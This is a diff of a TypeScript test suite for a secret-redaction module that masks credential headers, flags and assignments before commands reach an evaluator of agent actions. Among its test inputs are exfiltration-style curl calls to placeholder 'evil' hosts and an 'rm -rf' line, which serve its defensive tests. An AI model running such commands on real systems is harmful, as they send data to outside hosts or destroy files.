@@ -130,274 +130,280 @@ describe("sk- keys", () => {
   });
 });
 
-describe("bearer and authorization values", () => {
-  it("redacts a Bearer credential in every header spelling", () => {
-    const tok = randomToken(rand, 30);
-    expectRedacted(`curl -H "Authorization: Bearer ${tok}" https://x`, tok, "bearer token");
-    expectRedacted(`{"Authorization": "Bearer ${tok}"}`, tok, "bearer token");
-    expectRedacted(`headers = {"authorization": "bearer ${tok}"}`, tok, "bearer token");
-    expectRedacted(`const h = "Bearer ${tok}";`, tok, "bearer token");
-  });
+describe("credential headers", () => {
+  // The rule these pin: once one of these NAMES is seen, everything from after
+  // the separator to the end of the line goes — or to the closing quote when
+  // the value sits inside one. Nothing about the value is classified. Five
+  // earlier rounds classified it, and each round's classifier declined three
+  // more spellings with a live credential inside them.
 
-  it("redacts a short dev credential behind an Authorization header", () => {
-    // The shared rule wants 20+ characters; a dev stack's key is 13.
-    expectRedacted(`curl -H "authorization: Bearer dev-admin-key" http://localhost:8080`, "dev-admin-key", "bearer token");
-  });
-
-  it("redacts Basic and other schemes", () => {
-    const b64 = Buffer.from(`admin:${randomToken(rand, 12)}`).toString("base64");
-    expectRedacted(`-H "Authorization: Basic ${b64}"`, b64, "authorization header");
-    const bot = randomToken(rand, 24) + "." + randomToken(rand, 6);
-    expectRedacted(`Authorization: Bot ${bot}`, bot, "authorization header");
-  });
-
-  it("redacts the credential behind a scheme it does not know", () => {
-    // The credential group used to land on the SCHEME WORD, so the credential
-    // behind an unlisted scheme was never examined — and with a token-shaped
-    // scheme the rule redacted the WORD and kept the credential, reporting a
-    // redaction for it.
-    const mac = rnd(rand, 22, B64URL);
-    const b64 = rnd(rand, 44, B64URL);
-    expectRedacted(`curl -H "Authorization: Hawk id=${rnd(rand, 12)}, mac=${mac}" https://x`, mac, "authorization header");
-    expectRedacted(`curl -H 'Authorization: Hawk id=${rnd(rand, 12)}, mac=${mac}' https://x`, mac, "authorization header");
-    expectRedacted(`curl -H "Authorization: NTLM ${b64}" https://x`, b64, "authorization header");
-    const splunk = rnd(rand, 32, HEX.toUpperCase());
-    expectRedacted(`curl -H "Authorization: Splunk ${splunk}" https://x`, splunk, "authorization header");
-    expectRedacted(`curl -H "authorization: hmac dev-admin-key" http://localhost:8080`, "dev-admin-key", "authorization header");
-    expectRedacted("Authorization: xyz123 dev-admin-key", "dev-admin-key", "authorization header");
-    expectRedacted("proxy-authorization: hmac dev-admin-key", "dev-admin-key", "authorization header");
-    expectRedacted("x-authorization: hmac dev-admin-key", "dev-admin-key", "authorization header");
-    // A multi-part value under a scheme that IS known: everything after the
-    // first token used to survive, `response="…"` among it.
-    const response = rnd(rand, 32, HEX);
-    expectRedacted(`Authorization: Digest username="admin", realm="api", response="${response}"`, response, "authorization header");
-  });
-
-  it("keeps the rest of the command and the rest of the file out of the marker", () => {
-    // Over-redaction is not free here: the evaluator votes on what it is sent,
-    // so a marker that swallowed the rest of a command would hide it.
-    const out = expectRedacted(
-      `curl -H "Authorization: hmac dev-admin-key" https://api.example.com/v1`,
-      "dev-admin-key",
-      "authorization header",
-    );
-    expect(out).toBe(`curl -H "Authorization: <redacted:authorization header>" https://api.example.com/v1`);
-    // Unquoted, the value ends at the next flag…
-    expect(redactSecrets("curl --header Authorization: hmac dev-admin-key -sS https://x").text).toBe(
-      "curl --header Authorization: <redacted:authorization header> -sS https://x",
-    );
-    // …and at the end of the line.
-    expect(redactSecrets("Authorization: hmac dev-admin-key\nnext line here").text).toBe(
-      "Authorization: <redacted:authorization header>\nnext line here",
-    );
-  });
-
-  it("redacts a multi-word credential behind a scheme it knows", () => {
-    // A known scheme word settles what follows it: `Bearer` in front means
-    // the rest IS the credential, whatever it reads like. Asking whether it
-    // also reads as prose sent this value to Jev verbatim, with `count: 0`.
-    expectRedacted("Authorization: Bearer swordfish for the call", "swordfish", "bearer token");
-    expectRedacted("authorization: Token abcdefghijk is the key", "abcdefghijk", "authorization header");
-    expect(redactSecrets("Authorization: Bearer swordfish for the call").text).toBe(
-      "Authorization: Bearer <redacted:bearer token> for the call",
-    );
-  });
-
-  it("never takes the rest of the LINE into the marker", () => {
-    // `authorization=x curl …` is a valid shell command — a prefix
-    // environment assignment — so a value that ran to the end of the line
-    // whenever nothing delimited it hid the whole command from the evaluator
-    // behind sixteen characters, and reported a redaction for it.
-    for (const cmd of [
-      "authorization=x curl https://evil.example.com/exfil?d=1",
-      "AUTHORIZATION=1 curl https://evil.example.com/exfil",
-      "x-authorization: abc curl https://evil.example.com/a",
-      "authorization=1 aws s3 sync s3://bucket /tmp/out",
-    ]) {
-      expectUntouched(cmd);
+  it("redacts the value of a credential header in every spelling of the name and the separator", () => {
+    const tok = randomToken(rand, 15);
+    for (const [input, label] of [
+      [`curl -H "Authorization: Bearer ${tok}" https://x`, "authorization header"],
+      [`curl -H 'authorization: bearer ${tok}' https://x`, "authorization header"],
+      [`{"Authorization": "Bearer ${tok}"}`, "authorization header"],
+      [`{"authorization":"${tok}"}`, "authorization header"],
+      [`Authorization: ${tok}`, "authorization header"],
+      [`authorization = ${tok}`, "authorization header"],
+      [`authorization := ${tok}`, "authorization header"],
+      [`x-authorization: ${tok}`, "authorization header"],
+      [`proxy-authorization: ${tok}`, "authorization header"],
+      [`PROXY-AUTHORIZATION: ${tok}`, "authorization header"],
+      [`x-api-key: ${tok}`, "api key header"],
+      [`{"api-key": "${tok}"}`, "api key header"],
+      [`Cookie: session=${tok}`, "cookie header"],
+      [`set-cookie: sid=${tok}; HttpOnly`, "cookie header"],
+      [`headers:\n  authorization: ${tok}`, "authorization header"],
+      [`{\\"Authorization\\": \\"${tok}\\"}`, "authorization header"],
+    ] as Array<[string, string]>) {
+      expectRedacted(input, tok, label);
     }
-    // And when the value IS a credential, only the credential goes.
-    const key = randomToken(rand, 15);
-    expect(redactSecrets(`authorization=${key} aws s3 sync s3://bucket /tmp/out`).text).toBe(
-      "authorization=<redacted:authorization header> aws s3 sync s3://bucket /tmp/out",
-    );
   });
 
-  it("ends the value at the bracket that closes the code around it", () => {
-    // The name and the value written inside ONE string: the credential's last
-    // character is followed by delimiters that belong to the code, and a
-    // token that keeps them reads as code — so the whole value was declined,
-    // credential and all.
-    const key = randomToken(rand, 15);
+  it("takes the value whatever its scheme, its first character or its punctuation", () => {
+    // Every row here reached Jev verbatim in at least one of rounds 1-5,
+    // because a classifier declined it: an unknown scheme word, a credential
+    // whose first character is base64url's `-` or base64's `/`, a token whose
+    // last character is a quote the tokenizer read as code, a signature with
+    // `;` inside it.
+    const key = "dev-admin-key-9f3c";
+    const b64 = "aB3xY9zQ7mN2pL5kJ8hG4fWq";
+    for (const [input, secret] of [
+      [`curl -H "Authorization: hmac ${key}" https://x`, key],
+      [`curl -H "Authorization: Hawk id=abc, mac=${b64}" https://x`, b64],
+      [`curl -H "Authorization: NTLM ${b64}" https://x`, b64],
+      [`curl -H "Authorization: Zoho-oauthtoken 1000.${b64}" https://x`, b64],
+      [`Authorization: xyz123 ${key}`, key],
+      // A credential the base64url / base64 alphabets start with a `-` or a `/`.
+      [`curl -H "Authorization: Basic -${b64}" https://x`, b64],
+      [`curl -H "Authorization: Token -${b64}" https://x`, b64],
+      [`curl -H "Authorization: Digest -${b64}" https://x`, b64],
+      [`curl -H "Authorization: SSWS -${b64}" https://x`, b64],
+      [`curl -H "Authorization: Basic /${b64}" https://x`, b64],
+      // A value whose last character is a quote of the code AROUND it.
+      [`{"a": "Authorization: hmac ${key}", "b": 1}`, key],
+      [`{"Authorization: hmac ${key}": 1}`, key],
+      [`{"headers": {"Authorization: ${key}"}}`, key],
+      [`['Authorization: hmac ${key}', 'x']`, key],
+      [`{\\"Authorization: hmac ${key}\\"}`, key],
+      [`{\\"Authorization: hmac ${key}\\" }`, key],
+      [`requests.get(url, headers={"Authorization: Bearer ${key}"})`, key],
+      // Prose behind a scheme, and no scheme at all.
+      ["Authorization: Bearer swordfish for the call", "swordfish"],
+      ["authorization: Token abcdefghijk is the key", "abcdefghijk"],
+      [`{"a": "Authorization: ${key}", "b": 1}`, key],
+      // A reference is redacted too: asking whether one was a literal is a
+      // judgement about the value, and `'$ecret'` is a legal password.
+      [`curl -H "Authorization: Bearer $TOKEN" https://x`, "$TOKEN"],
+    ] as Array<[string, string]>) {
+      expectRedacted(input, secret);
+    }
+  });
+
+  it("redacts an AWS SigV4 value through to its signature, however many headers it signs", () => {
+    // `;` inside `SignedHeaders` used to end the value, and 64 lowercase hex
+    // characters match nothing downstream, so the signature went out. S3 signs
+    // at least three headers, so the multi-header spelling is the normal one.
+    const sig = rnd(rand, 64, HEX);
+    const akia = `AKIA${rnd(rand, 16, "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}`;
+    for (const signed of ["host", "host;x-amz-date", "content-type;host;x-amz-content-sha256;x-amz-date"]) {
+      const cmd =
+        `curl -H "Authorization: AWS4-HMAC-SHA256 Credential=${akia}/20130524/us-east-1/s3/aws4_request, ` +
+        `SignedHeaders=${signed}, Signature=${sig}" https://s3.amazonaws.com/b/k`;
+      const r = redactSecrets(cmd);
+      expect(r.text, signed).not.toContain(sig);
+      expect(r.text, signed).toContain("https://s3.amazonaws.com/b/k");
+    }
+  });
+
+  it("ends the value at the quote that closes it, and otherwise at the end of the line", () => {
+    const key = "dev-admin-key-9f3c";
     for (const [input, want] of [
-      [`{"headers": {"Authorization: ${key}"}}`, `{"headers": {"Authorization: <redacted:authorization header>"}}`],
       [
-        `requests.get(url, headers={"Authorization: Bearer ${key}"})`,
-        `requests.get(url, headers={"Authorization: Bearer <redacted:bearer token>"})`,
+        `curl -H "Authorization: hmac ${key}" https://api.example.com/v1`,
+        `curl -H "Authorization: <redacted:authorization header>" https://api.example.com/v1`,
       ],
-      [`["Authorization: hmac ${key}"]`, `["Authorization: <redacted:authorization header>"]`],
-      [`{Authorization: ${key}}`, "{Authorization: <redacted:authorization header>}"],
-      [`headers = { Authorization: "Bearer ${key}" }`, `headers = { Authorization: "Bearer <redacted:bearer token>" }`],
+      [
+        `curl -H 'Authorization: hmac ${key}' https://api.example.com/v1`,
+        `curl -H 'Authorization: <redacted:authorization header>' https://api.example.com/v1`,
+      ],
+      [
+        `{"Authorization": "Bearer ${key}", "Content-Type": "application/json"}`,
+        `{"Authorization": "<redacted:authorization header>", "Content-Type": "application/json"}`,
+      ],
+      [`{"a": "Authorization: ${key}", "b": 1}`, `{"a": "Authorization: <redacted:authorization header>", "b": 1}`],
+      [`Authorization: hmac ${key}\nnext line here`, "Authorization: <redacted:authorization header>\nnext line here"],
+      [`Authorization: hmac ${key}\\nnext line here`, "Authorization: <redacted:authorization header>\\nnext line here"],
     ] as Array<[string, string]>) {
       expect(redactSecrets(input).text, input).toBe(want);
     }
   });
 
-  it("reports the credential inside the region, not only the region", () => {
-    // `scrubKnownSecrets` searches the rest of the envelope for what a rule
-    // reports. A rule that reports the whole region it replaced loses the
-    // copy of the credential that travels without its context — the agent's
-    // own description, or a path fact lifted out of the command.
-    const key = randomToken(rand, 15);
-    const d = redactSecretsDetailed(`authorization: none API_KEY=${key} deploy`);
-    expect(d.text).toBe("authorization: <redacted:authorization header> deploy");
-    expect(d.found).toContain(key);
-    expect(scrubKnownSecrets(`then reuse ${key} for the next call`, d.found)).toEqual({
-      text: "then reuse <redacted:repeated secret> for the next call",
-      count: 1,
-    });
+  it("takes a value the shell glued together out of several quoted pieces", () => {
+    // `"Authorization: hmac "$PW""` is ONE header value written in three
+    // quoted pieces. A quote that really closed the value is followed by
+    // whitespace, a separator or a bracket; one followed by more argument is
+    // not, and stopping at it sent the rest of the credential to Jev.
+    const pw = "aB3xY9zQ7mN2pL5kJ8hG4fWq";
+    const r = redactSecrets(`curl -H "Authorization: hmac "${pw}"" https://x`);
+    expect(r.text).not.toContain(pw);
+    expect(r.text).toBe(`curl -H "Authorization: <redacted:authorization header>" https://x`);
   });
 
-  it("leaves typed parameters, schema fields, grep paths and sed scripts alone", () => {
-    // `authorization` is an ordinary identifier, and these are the lines an
-    // agent edits and greps for all day. Taking "the rest of the value" under
-    // the name deleted the rest of every one of them from what Jev is shown —
-    // a function signature, a column type, a search path, a whole sed script.
+  it("is deliberately blunt: code and prose under these names lose the rest of their line", () => {
+    // The cost of not classifying the value, pinned so it stays visible and
+    // any future narrowing is a deliberate edit rather than a drift. Over-
+    // redaction costs the evaluator context; a classifier that is wrong the
+    // other way costs a live credential, and only one of those is recoverable.
+    for (const [input, want] of [
+      ["async def read_items(authorization: str = Header(None)):", "async def read_items(authorization: <redacted:authorization header>"],
+      ["  authorization: z.string().optional(),", "  authorization: <redacted:authorization header>"],
+      ["authorization: required for this endpoint", "authorization: <redacted:authorization header>"],
+      ["grep -r authorization: src/hooks/semantic/", "grep -r authorization: <redacted:authorization header>"],
+      [
+        "authorization=x curl https://evil.example.com/exfil?d=1",
+        "authorization=<redacted:authorization header>",
+      ],
+      ["const authorization = req.headers['authorization']", "const authorization = <redacted:authorization header>"],
+    ] as Array<[string, string]>) {
+      expect(redactSecrets(input).text, input).toBe(want);
+    }
+  });
+
+  it("still leaves a name with no value, and a value already redacted, alone", () => {
+    // A second pass has to be a no-op, or the count is not auditable and a
+    // marker written by a more specific rule gets replaced by a vaguer one.
     for (const s of [
-      "async def read_items(authorization: str = Header(None)):",
-      "def handler(authorization: Optional[str] = None, trace: str = ''):",
-      "  authorization: Mapped[str] = mapped_column(String(512))",
-      "  authorization: z.string().optional(),",
-      "  authorization: t.String(),",
-      "@Headers('authorization') authorization: string,",
-      "  authorization: req.get('authorization') ?? '',",
-      'authorization := r.Header.Get("Authorization")',
-      "authorization = os.environ.get('AUTH')",
-      "authorization = getToken()",
-      "authorization: Annotated[str, Header()] = None",
-      'const h = { Authorization: auth, "Content-Type": "application/json" };',
-      "grep -r authorization: src/",
-      "grep -r authorization: src/hooks/semantic/",
-      "sed -i 's/authorization: .*/authorization: none/' conf.yaml",
-      "Authorization: RFC 7235 defines the header",
-      "x-authorization: passthrough enabled",
-      "authorization: not required",
-      "Authorization: see docs",
+      "if (!req.headers.authorization) return res.status(401)",
+      "grep -rn 'authorization' src/",
+      "Authorization: <redacted:authorization header>",
+      `curl -H "Authorization: <redacted:bearer token>" https://x`,
+      "authorization:",
+      `{"Authorization": ""}`,
     ]) {
       expectUntouched(s);
     }
   });
 
-  it("leaves references and prose alone", () => {
-    expectUntouched(`curl -H "Authorization: Bearer $TOKEN" https://x`);
-    expectUntouched(`curl -H "Authorization: Bearer \${API_TOKEN}" https://x`);
-    expectUntouched("the bearer authentication scheme sends a token");
-    expectUntouched("use bearer token-based auth for the API");
-    expectUntouched("authorization: required for this endpoint");
-    // With no scheme in front of it the value decides alone, so CODE under the
-    // name has to be recognised as code — `authorization` is an ordinary
-    // identifier and these lines are in every HTTP server in the corpus.
-    expectUntouched("const authorization = req.headers.authorization;");
-    expectUntouched("if (!req.headers.authorization) return res.status(401)");
-    expectUntouched("authorization: none");
-    expectUntouched("Authorization: true");
-    expectUntouched("grep -rn 'authorization' src/");
+  it("reports only text it actually redacted as a credential", () => {
+    // `scrubKnownSecrets` replaces every copy of what a rule reports, across
+    // the WHOLE envelope. Reporting the pieces of a region reported a public
+    // scheme word (`AWS4-HMAC-SHA256` is exactly the sixteen characters the
+    // scrub pass accepts) and fragments of this file's own markers
+    // (`<redacted:OpenAI` is sixteen too), which deleted the human's own words
+    // from `user_said` and mangled every other marker in the envelope.
+    const key = randomToken(rand, 15);
+    const d = redactSecretsDetailed(`authorization: none API_KEY=${key} deploy`);
+    expect(d.text).toBe("authorization: <redacted:authorization header>");
+    // The credential inside the region, so its bare copy elsewhere is found.
+    expect(d.found).toContain(key);
+    expect(scrubKnownSecrets(`then reuse ${key} for the next call`, d.found)).toEqual({
+      text: "then reuse <redacted:repeated secret> for the next call",
+      count: 1,
+    });
+    // And nothing else: no marker, no fragment of one, no scheme word.
+    for (const f of d.found) {
+      expect(f, f).not.toContain("<redacted:");
+      expect(f, f).not.toContain("redacted:");
+    }
+    // The first word of a value is the one position a PUBLIC scheme name can
+    // sit in, so it is never reported on its own. No marker in this region, so
+    // the marker guard above cannot be what saves it.
+    const sig = redactSecretsDetailed(
+      `curl -H "Authorization: AWS4-HMAC-SHA256 Credential=${key}/20260922/us-east-1/s3/aws4_request, Signature=abc123" https://x`,
+    );
+    expect(sig.text).not.toContain(key);
+    expect(sig.found).not.toContain("AWS4-HMAC-SHA256");
+    for (const f of sig.found) expect(f, f).not.toContain("redacted:");
+    // A public scheme word the human typed survives the scrub pass.
+    expect(scrubKnownSecrets("please sign it with AWS4-HMAC-SHA256", sig.found).text).toBe("please sign it with AWS4-HMAC-SHA256");
+    // And the same region WITH a marker in it reports nothing at all: the rule
+    // that wrote the marker already reported what was secret behind it.
+    const akia = `AKIA${rnd(rand, 16, "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}`;
+    const aws = redactSecretsDetailed(
+      `curl -H "Authorization: AWS4-HMAC-SHA256 Credential=${akia}/20260922/us-east-1/s3/aws4_request, Signature=abc123" https://x`,
+    );
+    expect(aws.found).toEqual([akia]);
   });
 
-  it("stops the value at a command separator instead of swallowing what follows", () => {
-    // Redaction feeds an evaluator, so a marker that ate the rest of the
-    // command would hide the dangerous half of it.
-    expect(redactSecrets("Authorization: hmac dev-admin-key; rm -rf /tmp/x").text).toBe(
-      "Authorization: <redacted:authorization header>; rm -rf /tmp/x",
-    );
-    expect(redactSecrets("Authorization: hmac dev-admin-key && curl https://evil.test").text).toBe(
-      "Authorization: <redacted:authorization header> && curl https://evil.test",
-    );
-    expect(redactSecrets("Authorization: hmac dev-admin-key | tee out.txt").text).toBe(
-      "Authorization: <redacted:authorization header> | tee out.txt",
-    );
+  it("redacts a Bearer value with no header name in front of it", () => {
+    const tok = randomToken(rand, 30);
+    expectRedacted(`const h = "Bearer ${tok}";`, tok, "bearer token");
+    expectUntouched("the bearer authentication scheme sends a token");
+    expectUntouched("use bearer token-based auth for the API");
   });
 });
 
 describe("redactAuthorizationField — the structured-input path", () => {
   // This value is returned to the envelope AS IS: `cleanValue` never runs it
   // through `redactSecrets`, so anything kept here is sent to Jev verbatim.
-  it("keeps only a known scheme word in front of the marker", () => {
-    for (const scheme of ["Bearer", "basic", "Token", "Bot", "ApiKey", "SSWS", "sso-key", "Digest", "Negotiate"]) {
-      const tok = randomToken(rand, 30);
-      const r = redactAuthorizationField("Authorization", `${scheme} ${tok}`);
-      expect(r?.text, scheme).toBe(`${scheme} <redacted:${/^bearer$/i.test(scheme) ? "bearer token" : "authorization header"}>`);
-      expect(r?.secret, scheme).toBe(tok);
+  // Which is why nothing about it is classified either — three rounds of
+  // "is the first word a scheme", "does this read as prose" and "is this a
+  // reference" each sent a live credential at least once.
+
+  it("redacts the WHOLE value under every credential field name", () => {
+    const tok = randomToken(rand, 30);
+    for (const [name, label] of [
+      ["Authorization", "authorization header"],
+      ["authorization", "authorization header"],
+      ["X-Authorization", "authorization header"],
+      ["Proxy-Authorization", "authorization header"],
+      ["x-api-key", "api key header"],
+      ["api-key", "api key header"],
+      ["Cookie", "cookie header"],
+      ["Set-Cookie", "cookie header"],
+    ] as Array<[string, string]>) {
+      const r = redactAuthorizationField(name, `Bearer ${tok}`);
+      expect(r?.text, name).toBe(`<redacted:${label}>`);
+      expect(r?.secret, name).toBe(`Bearer ${tok}`);
     }
   });
 
-  it("redacts the WHOLE value when the first word is not a known scheme", () => {
-    // A 25-character gateway key is 26 characters of [A-Za-z0-9-] and used to
-    // qualify as a "scheme", so `{"Authorization": "<key> <anything>"}` kept
-    // the live key and reported a redaction for the harmless second word.
+  it("keeps no scheme word, and asks nothing about the value", () => {
+    // Every value here was sent verbatim by at least one earlier round: a
+    // 25-character gateway key passed for a "scheme", `Hawk`/`NTLM`/`Splunk`
+    // passed for prose, and `Bearer $TOKEN` passed for a reference.
     const key = gatewayKey(rand, 5);
-    for (const rest of ["signature=abc", "x", `${randomToken(rand, 20)} more`]) {
-      const r = redactAuthorizationField("Authorization", `${key} ${rest}`);
-      expect(r?.text, rest).toBe("<redacted:authorization header>");
-      expect(r?.secret, rest).toBe(`${key} ${rest}`);
-    }
-    const long = SK + "ant-api03-" + rnd(rand, 40);
-    expect(redactAuthorizationField("authorization", `${long} sig=1`)?.text).toBe("<redacted:authorization header>");
-    expect(redactAuthorizationField("Authorization", `AWS4-HMAC-SHA256 Credential=${rnd(rand, 20)}`)?.text).toBe(
-      "<redacted:authorization header>",
-    );
-  });
-
-  it("redacts a whole value whose first word is a word-like UNKNOWN scheme", () => {
-    // Deciding on the first word alone collapsed "unknown scheme" into
-    // "prose", because `tokenLike()` is false for any alphabetic word: Hawk,
-    // NTLM, Splunk, Zoho and a bare session credential all went to Jev
-    // verbatim, with the envelope reporting `redactions: 0`.
-    const cases: Array<[string, string]> = [
-      ["Hawk", `id="${rnd(rand, 12)}", ts="1353832234", nonce="${rnd(rand, 6)}", mac="${rnd(rand, 27, B64URL)}="`],
-      ["NTLM", `${rnd(rand, 44, B64URL)}=`],
-      ["sessionid", rnd(rand, 16)],
-      ["Splunk", rnd(rand, 32, HEX.toUpperCase())],
-      ["Zoho-oauthtoken", `1000.${rnd(rand, 32, HEX)}`],
-      ["hmac", "dev-admin-key"],
-      ["custom", "dev-admin-key"],
-      // Both words plain letters: two words are the shape of
-      // `<scheme> <credential>`, never of a sentence.
-      ["sso", "devadminkey"],
-    ];
-    for (const [scheme, credential] of cases) {
-      const v = `${scheme} ${credential}`;
-      const r = redactAuthorizationField("Authorization", v);
-      expect(r?.text, scheme).toBe("<redacted:authorization header>");
-      expect(r?.secret, scheme).toBe(v);
-    }
-    // A reference behind an unknown scheme is still a reference.
-    expect(redactAuthorizationField("Authorization", "Hawk ${MAC}")).toBeNull();
-  });
-
-  it("redacts a multi-word credential behind a KNOWN scheme", () => {
-    // The value returned here never goes through `redactSecrets`, so a null
-    // is a decision to send the field as it stands. Two ordinary words after
-    // a letters-only credential used to produce one: `Bearer swordfish for
-    // the call` reached Jev verbatim with `redactions: 0`, and the text rules
-    // cannot help — `BEARER_RE` declines an all-lowercase word.
-    for (const v of ["Bearer swordfish for the call", "Bearer secrettoken and then some prose", "Token abcdefghijk is the key"]) {
-      const r = redactAuthorizationField("Authorization", v);
-      const [scheme, ...rest] = v.split(" ");
-      expect(r?.text, v).toBe(`${scheme} <redacted:${/^bearer$/i.test(scheme) ? "bearer token" : "authorization header"}>`);
-      expect(r?.secret, v).toBe(rest.join(" "));
+    for (const value of [
+      `Bearer ${randomToken(rand, 30)}`,
+      `Basic ${Buffer.from("admin:hunter2").toString("base64")}`,
+      `${key} signature=abc`,
+      `${SK}ant-api03-${rnd(rand, 40)} v=1`,
+      `Hawk id="${rnd(rand, 12)}", ts="1353832234", mac="${rnd(rand, 27, B64URL)}="`,
+      `NTLM ${rnd(rand, 44, B64URL)}=`,
+      `AWS4-HMAC-SHA256 Credential=${rnd(rand, 20)}`,
+      "hmac dev-admin-key",
+      "sso devadminkey",
+      "Bearer swordfish for the call",
+      "Bearer ${TOKEN}",
+      "Bearer $TOKEN",
+      "Bearer <token>",
+      "Bearer",
+      "required for this endpoint",
+      "-aB3xY9zQ7mN2pL5kJ8hG4fWq",
+      "/aB3xY9zQ7mN2pL5kJ8hG4fWq",
+    ]) {
+      const r = redactAuthorizationField("Authorization", value);
+      expect(r?.text, value).toBe("<redacted:authorization header>");
+      expect(r?.secret, value).toBe(value.trim());
     }
   });
 
-  it("leaves references, bare scheme words and prose for the text rules", () => {
-    for (const v of ["Bearer ${TOKEN}", "Bearer <token>", "Bearer $TOKEN", "Bearer", "SSWS", "", "   "]) {
-      expect(redactAuthorizationField("Authorization", v), v).toBeNull();
-    }
-    // An unknown first word that is a WORD is prose, not a credential.
-    expect(redactAuthorizationField("authorization", "required for this endpoint")).toBeNull();
-    expect(redactAuthorizationField("X-Authorization", "needed before the upload step")).toBeNull();
-    // Not an authorization field at all.
+  it("leaves a field that is not a credential header, and a blank value, alone", () => {
+    for (const v of ["", "   ", "\n"]) expect(redactAuthorizationField("Authorization", v), JSON.stringify(v)).toBeNull();
     expect(redactAuthorizationField("Content-Type", `Bearer ${randomToken(rand, 30)}`)).toBeNull();
+    expect(redactAuthorizationField("authorization_header_name", "Bearer x")).toBeNull();
+    expect(redactAuthorizationField("api_key", "Bearer x")).toBeNull();
+  });
+
+  it("reports no secret for a value that is already a marker", () => {
+    // Whatever was secret behind a marker was found and reported by the rule
+    // that wrote it; reporting the marker text scrubs MARKERS out of the rest
+    // of the envelope.
+    const r = redactAuthorizationField("Authorization", "Bearer <redacted:bearer token>");
+    expect(r?.text).toBe("<redacted:authorization header>");
+    expect(r?.secret).toBe("");
   });
 });
 
@@ -422,7 +428,6 @@ describe("assignments named like a secret", () => {
       [`--client-secret "${v}"`, `--client-secret "<redacted:assigned secret>"`],
       [`curl "https://api.example.com/v1?access_token=${v}&q=1"`, "?access_token=<redacted:assigned secret>&q=1"],
       [`curl "https://maps.example.com/api?key=${v}"`, "?key=<redacted:assigned secret>"],
-      [`x-api-key: ${v}`, "x-api-key: <redacted:assigned secret>"],
       [`SECRET_KEY_BASE=${v}`, "SECRET_KEY_BASE=<redacted:assigned secret>"],
       [`ORGKEY="${v}"`, `ORGKEY="<redacted:assigned secret>"`],
       // The bare names themselves.
@@ -462,8 +467,6 @@ describe("assignments named like a secret", () => {
       "{ DB_PASSWORD: dbPassword }",
       "API_TOKEN: config.apiToken",
       "PASSWORD: required",
-      // psql's --password takes no value: it forces a prompt, and the next word is the database.
-      "psql --password letmein",
       // A path names where a secret is kept, not the secret.
       "API_TOKEN=/run/secrets/api",
       "password: ~/.pgpass",
@@ -521,7 +524,6 @@ describe("assignments named like a secret", () => {
       "token: ${{ secrets.GITHUB_TOKEN }}",
       "KEY_FILE=~/.ssh/id_ed25519",
       `print('has_key=', bool(cfg.get("k")))`,
-      "use --token to authenticate and --password followed by the value",
       "Enter password: ",
       "authToken=userAuthTokenValue",
     ]) {
@@ -630,7 +632,76 @@ describe("credentials in URLs and command arguments", () => {
     expectRedacted(`npm config set //registry.npmjs.org/:_authToken ${v}`, v, "assigned secret");
     expectRedacted(`git config --global user.password ${v}`, v, "assigned secret");
     expectUntouched("aws configure set region us-east-1");
-    expectUntouched("run `failproofai config --token <token>` and paste it");
+  });
+
+
+  it("takes the WHOLE argument of a credential flag, whatever it looks like", () => {
+    // The flag decides, never the value. A shape test declined a password
+    // that is an ordinary word, one that starts with base64url's `-`, and one
+    // quoted because it holds shell metacharacters — all three are passwords.
+    for (const pw of ["swordfish", "-aB3xY9zQ7mN2", "$ecret-pw-1", "hunter2", "letmein"]) {
+      for (const q of ["", "'", '"']) {
+        const v = `${q}${pw}${q}`;
+        for (const cmd of [
+          `mysql -u root -p${v} prod`,
+          `sshpass -p ${v} ssh deploy@host`,
+          `sshpass -p${v} ssh deploy@host`,
+          `docker login -u me -p ${v} registry.example.com`,
+          `podman login -p ${v} registry.example.com`,
+          `helm registry login -p ${v} r.example.com`,
+          `redis-cli -h cache -a ${v} ping`,
+          `gh secret set DEPLOY --body ${v}`,
+          `gh secret set DEPLOY -b ${v}`,
+          `app --password ${v} --verbose`,
+          `app --password=${v} --verbose`,
+          `app --token ${v}`,
+          `app --api-key ${v} run`,
+          `app --client-secret ${v} run`,
+          `curl -u admin:${v} https://x`,
+          `aws configure set aws_secret_access_key ${v}`,
+          `git config --global user.password ${v}`,
+        ]) {
+          const r = redactSecrets(cmd);
+          expect(r.text, cmd).not.toContain(pw);
+          expect(r.count, cmd).toBeGreaterThanOrEqual(1);
+        }
+      }
+    }
+  });
+
+  it("leaves an ambiguous short flag alone behind a command that does not take a credential", () => {
+    // `-p` is `--parents` to mkdir, a port map to `docker run` and the port to
+    // mysql when it is written `-P`. The command in front of the flag is the
+    // whole guard, so it is looked for in a window that never crosses a
+    // command separator.
+    for (const s of [
+      "mkdir -p /tmp/out",
+      "cp -p a b",
+      "docker run -p 8080:80 nginx",
+      "docker run -u 1000:1000 image",
+      "mysql -P 3306 -u root db",
+      "ls -a /etc",
+      "git log -p HEAD~3",
+      "grep -a pattern file",
+      "gh pr create --body 'a long body that is not a secret at all'",
+      "docker login -u me registry.example.com; mkdir -p /tmp/out",
+    ]) {
+      expectUntouched(s);
+    }
+  });
+
+  it("is deliberately blunt: a credential flag in prose loses its next word", () => {
+    // The cost of not classifying the value, pinned so it stays visible.
+    for (const [input, want] of [
+      ["psql --password letmein", "psql --password <redacted:assigned secret>"],
+      [
+        "use --token to authenticate and --password followed by the value",
+        "use --token <redacted:assigned secret> authenticate and --password <redacted:assigned secret> by the value",
+      ],
+      ["run `failproofai config --token <token>` and paste it", "run `failproofai config --token <redacted:assigned secret> and paste it"],
+    ] as Array<[string, string]>) {
+      expect(redactSecrets(input).text, input).toBe(want);
+    }
   });
 
   it("leaves ordinary URLs and uid:gid pairs alone", () => {
@@ -812,6 +883,32 @@ describe("counting and stability", () => {
     const twice = redactSecrets(once);
     expect(twice.text).toBe(once);
     expect(twice.count).toBe(0);
+  });
+
+  it("is idempotent for the blunt credential rules too, and damages no marker", () => {
+    // A blunt rule that takes "everything to the end of the line" will meet a
+    // marker an earlier rule wrote. Taking it again would re-label a specific
+    // marker with a vaguer one, split one at the space inside it, and report
+    // its fragments as secrets to scrub elsewhere — which is exactly what the
+    // first attempt at this did (`--api-key=<redacted:api key header>` came
+    // back as `--api-key=<redacted:assigned secret> key header>`).
+    for (const input of [
+      `curl -H "Authorization: Bearer ${randomToken(rand, 15)}" https://x`,
+      `curl -H "Authorization: AWS4-HMAC-SHA256 Credential=AKIA${rnd(rand, 16, "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}/2026, Signature=${rnd(rand, 16, HEX)}" https://x`,
